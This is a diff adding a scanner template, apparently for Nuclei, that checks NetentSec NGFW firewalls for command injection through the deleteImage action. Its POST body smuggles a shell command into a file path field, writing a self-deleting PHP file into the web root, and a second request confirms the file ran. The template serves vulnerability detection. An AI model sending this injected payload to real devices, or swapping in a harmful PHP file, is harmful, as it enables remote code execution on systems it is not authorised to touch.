@@ -1,0 +1,43 @@
+id: netentsec-ngfw-command-injection-CT-194295
+info:
+  name: NetentSec NGFW Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for a command injection vulnerability in NetentSec NGFW via the deleteImage action, allowing arbitrary PHP code execution.
+  reference:
+    - https://blog.csdn.net/weixin_43227251/article/details/115658803
+variables:
+  r2: "{{rand_text_alpha(10)}}"
+http:
+  - id: "r0"
+    method: POST
+    path:
+      - "/directdata/direct/router"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php echo md5({{r2}});unlink(__FILE__);?>' >/var/www/html/{{r2}}.php"]}],"type":"rpc","tid":17}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SSLVPN_Resource"
+      - type: word
+        words:
+          - "\"result\":{\"success\":true}"
+  - id: "r1"
+    method: GET
+    path:
+      - "/{{r2}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r2)}}"
